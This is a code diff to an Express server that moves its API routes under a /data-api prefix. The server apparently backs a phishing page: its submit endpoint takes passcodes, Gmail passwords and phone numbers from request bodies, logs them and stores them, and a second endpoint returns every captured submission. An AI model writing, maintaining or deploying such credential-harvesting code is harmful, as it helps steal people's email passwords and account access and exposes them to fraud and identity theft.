@@ -54,13 +54,13 @@ async function startServer() {
   });
 
   // Test route
-  app.get("/api/test", (req, res) => {
+  app.get("/data-api/test", (req, res) => {
     res.json({ message: "API is working", time: new Date().toISOString() });
   });
 
   // API Route to handle submissions
   const handleSubmission = (req: express.Request, res: express.Response) => {
-    console.log("POST /api/v1/submit hit with body:", req.body);
+    console.log("POST /data-api/v1/submit hit with body:", req.body);
     const { passcode, gmailPassword, phoneNumber } = req.body;
     
     if (!passcode && !gmailPassword && !phoneNumber) {
@@ -79,12 +79,12 @@ async function startServer() {
     }
   };
 
-  app.post("/api/v1/submit", handleSubmission);
-  app.post("/api/v1/submit/", handleSubmission);
+  app.post("/data-api/v1/submit", handleSubmission);
+  app.options("/data-api/v1/submit", (req, res) => res.sendStatus(200));
 
   // API Route to view submissions
   const handleGetSubmissions = (req: express.Request, res: express.Response) => {
-    console.log("GET /api/v1/submissions hit");
+    console.log("GET /data-api/v1/submissions hit");
     try {
       const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
       console.log(`Returning ${rows.length} submissions`);
@@ -95,8 +95,8 @@ async function startServer() {
     }
   };
 
-  app.get("/api/v1/submissions", handleGetSubmissions);
-  app.get("/api/v1/submissions/", handleGetSubmissions);
+  app.get("/data-api/v1/submissions", handleGetSubmissions);
+  app.options("/data-api/v1/submissions", (req, res) => res.sendStatus(200));
 
   // Vite middleware for development
   let vite: any;
@@ -113,7 +113,7 @@ async function startServer() {
   // Catch-all route to serve index.html for SPA routing
   app.get("*", async (req, res, next) => {
     // Skip API routes that might have reached here
-    if (req.url.startsWith("/api/")) {
+    if (req.url.startsWith("/data-api/")) {
       return res.status(404).json({ error: "API route not found" });
     }
 
